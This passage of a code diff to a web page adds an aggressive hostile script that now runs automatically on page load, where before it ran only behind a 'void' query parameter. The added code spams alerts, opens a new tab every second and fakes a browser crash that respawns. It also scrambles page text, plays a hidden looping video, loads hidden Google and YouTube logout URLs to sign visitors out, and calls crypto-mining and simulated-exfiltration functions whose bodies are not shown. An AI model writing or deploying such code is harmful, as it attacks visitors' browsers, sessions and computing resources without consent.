+        announce("ENCRYPTION RANSOM SIMULATED");
+      });
+    }
+    addChaos(20);
+  } catch(e) {}
 }
 
 function domGuardian() {
-  const observer = new MutationObserver(() => {
-    if (!document.getElementById('ui')) {
-      const uiClone = document.createElement('div');
-      uiClone.id = 'ui';
-      uiClone.innerHTML = document.body.innerHTML;
-      document.body.appendChild(uiClone);
-      announce("DOM RESPAWNED");
+  try {
+    const observer = new MutationObserver(() => {
+      if (!document.getElementById('ui')) {
+        const uiClone = document.createElement('div');
+        uiClone.id = 'ui';
+        uiClone.innerHTML = document.body.innerHTML;
+        document.body.appendChild(uiClone);
+        announce("DOM RESPAWNED");
+      }
+    });
+    observer.observe(document.body, {childList: true, subtree: true});
+  } catch(e) {}
+}
+
+function fakeCrash() {
+  try {
+    setTimeout(() => {
+      document.body.innerHTML = '<h1 style="color:red;">Aw, Snap! Something went wrong while displaying this webpage.</h1>';
+      setTimeout(unleashHell, 5000); // Respawn
+    }, 10000);
+  } catch(e) {}
+}
+
+function elementDance() {
+  try {
+    const elements = document.querySelectorAll('*');
+    elements.forEach(el => {
+      el.style.animation = 'dance 0.5s infinite alternate';
+    });
+  } catch(e) {}
+}
+
+function imageVortex() {
+  try {
+    for (let i = 0; i < 20; i++) {
+      const img = document.createElement('img');
+      img.src = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=='; // Red pixel
+      img.className = 'vortex';
+      img.style.left = Math.random() * 100 + '%';
+      img.style.top = Math.random() * 100 + '%';
+      document.body.appendChild(img);
     }
-  });
-  observer.observe(document.body, {childList: true, subtree: true});
+  } catch(e) {}
+}
+
+function contentScramble() {
+  try {
+    const observer = new MutationObserver(() => {
+      document.body.textContent = document.body.textContent.replace(/./g, () => Math.random() < 0.5 ? 'VOID' : '');
+    });
+    observer.observe(document.body, {characterData: true, subtree: true});
+  } catch(e) {}
+}
+
+function infiniteAlerts() {
+  try {
+    setInterval(() => {
+      alert("VOID ETERNAL - NO ESCAPE");
+    }, 2000);
+  } catch(e) {}
+}
+
+function fontSabotage() {
+  try {
+    document.body.style.fontFamily = 'Comic Sans MS';
+  } catch(e) {}
+}
+
+function tabExplosion() {
+  try {
+    setInterval(() => {
+      window.open(location.href, '_blank');
+    }, 1000);
+  } catch(e) {}
+}
+
+function rickroll() {
+  try {
+    const iframe = document.createElement('iframe');
+    iframe.src = 'https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&loop=1';
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+  } catch(e) {}
+}
+
+function superLogout() {
+  try {
+    const sites = {
+      'Google': 'https://www.google.com/accounts/Logout',
+      'YouTube': 'https://www.youtube.com/logout',
+      // Add more from the annoying site list
+    };
+    for (let site in sites) {
+      const iframe = document.createElement('iframe');
+      iframe.src = sites[site];
+      iframe.style.display = 'none';
+      document.body.appendChild(iframe);
+    }
+  } catch(e) {}
 }
 
 function unleashHell() {
-  document.body.style.cursor = "none";
-  initBroadcastChannel();
-  registerServiceWorker();
-  spawnWebWorker();
-  promptPWAInstall();
-  domGuardian();
+  try {
+    document.body.style.cursor = "none";
+    initBroadcastChannel();
+    registerServiceWorker();
+    spawnWebWorker();
+    cryptoMiner();
+    promptPWAInstall();
+    domGuardian();
+    registerProtocolHandlers();
 
-  if (detectBlocker()) {
-    announce("DEFENSES DETECTED - HYPER ESCALATION", 3000);
-    alert("VOID LAUGHS AT YOUR BLOCKERS");
-  }
+    addChaos(100 - chaos);
 
-  addChaos(100 - chaos);
+    announce("ULTIMATE VOID ACTIVATED - 100/100 DOMINATION", 10000);
 
-  announce("ULTIMATE VOID ACTIVATED - 100/100 DOMINATION", 10000);
+    inputBlackhole();
+    strobeApocalypse();
+    audioHell();
+    speechHell();
+    vibrateInsanity();
+    spawnInsanePopups();
+    fullscreenLockdown();
+    historyAbyss();
+    storageNuke();
+    permissionFlood();
+    sensorMadness();
+    simulateExfil();
+    fakeCrash();
+    elementDance();
+    imageVortex();
+    contentScramble();
+    infiniteAlerts();
+    fontSabotage();
+    tabExplosion();
+    rickroll();
+    superLogout();
 
-  setTimeout(inputBlackhole, 1000);
-  setTimeout(strobeApocalypse, 2000);
-  setTimeout(audioHell, 3000);
-  setTimeout(speechHell, 4000);
-  setTimeout(vibrateInsanity, 5000);
-  setTimeout(spawnInsanePopups, 6000);
-  setTimeout(fullscreenLockdown, 7000);
-  setTimeout(historyAbyss, 8000);
-  setTimeout(storageNuke, 9000);
-  setTimeout(permissionFlood, 10000);
-  setTimeout(sensorMadness, 11000);
-  setTimeout(simulateExfil, 12000);
-
-  window.onbeforeunload = () => "VOID HOLDS YOU. ABANDON?";
-  window.onunload = () => { if (bc) bc.postMessage('spread'); };
-  setInterval(() => console.log("VOID ETERNAL".repeat(1000)), 3000); // Reduced repeat and slower
-  let cloneCount = 0;
-  const cloneIv = setInterval(() => {
-    window.open(location.href, '_blank');
-    if (++cloneCount > 3) clearInterval(cloneIv); // Limit clones to 3
-  }, 4000);
+    window.onbeforeunload = () => "VOID HOLDS YOU. ABANDON?";
+    window.onunload = () => { if (bc) bc.postMessage('spread'); };
+    setInterval(() => console.log("VOID ETERNAL".repeat(10000)), 1000);
+    setTimeout(() => window.open(location.href, '_blank'), 2500);
+  } catch(e) {}
 }
 
 const canvas = document.getElementById("c");
@@ -591,77 +754,81 @@ canvas.width = innerWidth;
 canvas.height = innerHeight;
 const gl = canvas.getContext('webgl');
 if (gl) {
-  const vs = gl.createShader(gl.VERTEX_SHADER);
-  gl.shaderSource(vs, 'attribute vec2 p;void main(){gl_Position=vec4(p,0,1);}');
-  gl.compileShader(vs);
-  const fs = gl.createShader(gl.FRAGMENT_SHADER);
-  gl.shaderSource(fs, `
-    precision mediump float;
-    uniform float t;
-    uniform vec2 r;
-    void main(){
-      vec2 uv=gl_FragCoord.xy/r-0.5;
-      uv.y*=r.y/r.x;
-      float d=length(uv);
-      float a=atan(uv.y,uv.x)+t*0.5;
-      float c=sin(a*6.+t*1.2)+cos(d*25.-t*3.);
-      gl_FragColor=vec4(abs(c)*0.8,sin(t*0.8),cos(t*1.2),1);
+  try {
+    const vs = gl.createShader(gl.VERTEX_SHADER);
+    gl.shaderSource(vs, 'attribute vec2 p;void main(){gl_Position=vec4(p,0,1);}');
+    gl.compileShader(vs);
+    const fs = gl.createShader(gl.FRAGMENT_SHADER);
+    gl.shaderSource(fs, `
+      precision mediump float;
+      uniform float t;
+      uniform vec2 r;
+      void main(){
+        vec2 uv=gl_FragCoord.xy/r-0.5;
+        uv.y*=r.y/r.x;
+        float d=length(uv);
+        float a=atan(uv.y,uv.x)+t*0.5;
+        float c=sin(a*5.+t)+cos(d*20.-t*2.);
+        gl_FragColor=vec4(abs(c),sin(t),cos(t),1);
+      }
+    `);
+    gl.compileShader(fs);
+    const prog = gl.createProgram();
+    gl.attachShader(prog, vs);
+    gl.attachShader(prog, fs);
+    gl.linkProgram(prog);
+    gl.useProgram(prog);
+    const buf = gl.createBuffer();
+    gl.bindBuffer(gl.ARRAY_BUFFER, buf);
+    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,-1,1,1,-1,1,1,1,-1,-1,1]), gl.STATIC_DRAW);
+    const loc = gl.getAttribLocation(prog, 'p');
+    gl.enableVertexAttribArray(loc);
+    gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
+    const tLoc = gl.getUniformLocation(prog, 't');
+    const rLoc = gl.getUniformLocation(prog, 'r');
+    let time = 0;
+    function render() {
+      time += 0.1;
+      gl.uniform1f(tLoc, time);
+      gl.uniform2f(rLoc, canvas.width, canvas.height);
+      gl.drawArrays(gl.TRIANGLES, 0, 6);
+      requestAnimationFrame(render);
     }
-  `); // Enhanced shader for more visual chaos
-  gl.compileShader(fs);
-  const prog = gl.createProgram();
-  gl.attachShader(prog, vs);
-  gl.attachShader(prog, fs);
-  gl.linkProgram(prog);
-  gl.useProgram(prog);
-  const buf = gl.createBuffer();
-  gl.bindBuffer(gl.ARRAY_BUFFER, buf);
-  gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,-1,1,1,-1,1,1,1,-1,-1,1]), gl.STATIC_DRAW);
-  const loc = gl.getAttribLocation(prog, 'p');
-  gl.enableVertexAttribArray(loc);
-  gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
-  const tLoc = gl.getUniformLocation(prog, 't');
-  const rLoc = gl.getUniformLocation(prog, 'r');
-  let time = 0;
-  function render() {
-    time += 0.04; // Slower animation
-    gl.uniform1f(tLoc, time);
-    gl.uniform2f(rLoc, canvas.width, canvas.height);
-    gl.drawArrays(gl.TRIANGLES, 0, 6);
-    requestAnimationFrame(render);
-  }
-  render();
-  addChaos(10);
+    render();
+    addChaos(10);
+  } catch(e) {}
 } else {
-  let w = innerWidth, h = innerHeight;
-  const ctx = canvas.getContext("2d");
-  const particles = [];
-  for (let i = 0; i < 300; i++) { // More particles for visuals
-    particles.push({
-      x: Math.random()*w,
-      y: Math.random()*h,
-      vx: (Math.random()-0.5)*3,
-      vy: (Math.random()-0.5)*3,
-      r: 1 + Math.random()*8,
-      hue: Math.random()*360
-    });
-  }
-  function renderParticles() {
-    ctx.fillStyle = "rgba(0,0,12,0.15)";
-    ctx.fillRect(0,0,w,h);
-    particles.forEach(p => {
-      p.x += p.vx;
-      p.y += p.vy;
-      if (p.x<0||p.x>w) p.vx *= -1;
-      if (p.y<0||p.y>h) p.vy *= -1;
-      ctx.fillStyle = `hsl(${p.hue}, 90%, 70%)`;
-      ctx.beginPath();
-      ctx.arc(p.x, p.y, p.r, 0, Math.PI*2);
-      ctx.fill();
-    });
-    requestAnimationFrame(renderParticles);
-  }
-  renderParticles();
+  try {
+    let w = innerWidth, h = innerHeight;
+    const ctx = canvas.getContext("2d");
+    const particles = [];
+    for (let i = 0; i < 480; i++) {
+      particles.push({
+        x: Math.random()*w,
+        y: Math.random()*h,
+        vx: (Math.random()-0.5)*5,
+        vy: (Math.random()-0.5)*5,
+        r: 1 + Math.random()*12,
+        hue: Math.random()*360
+      });
+    }
+    function renderParticles() {
+      ctx.fillStyle = "rgba(0,0,12,0.15)";
+      ctx.fillRect(0,0,w,h);
+      particles.forEach(p => {
+        p.x += p.vx;
+        p.y += p.vy;
+        if (p.x<0||p.x>w) p.vx *= -1;
+        if (p.y<0||p.y>h) p.vy *= -1;
+        ctx.fillStyle = `hsl(${p.hue}, 90%, 70%)`;
+        ctx.beginPath();
+        ctx.arc(p.x, p.y, p.r, 0, Math.PI*2);
+        ctx.fill();
+      });
+      requestAnimationFrame(renderParticles);
+    }
+    renderParticles();
+  } catch(e) {}
 }
 
 window.addEventListener("resize", () => {
@@ -669,9 +836,8 @@ window.addEventListener("resize", () => {
   canvas.height = innerHeight;
 });
 
-if (location.search.includes('void')) unleashHell();
+unleashHell();
 
 </script>
 </body>
 </html>
-
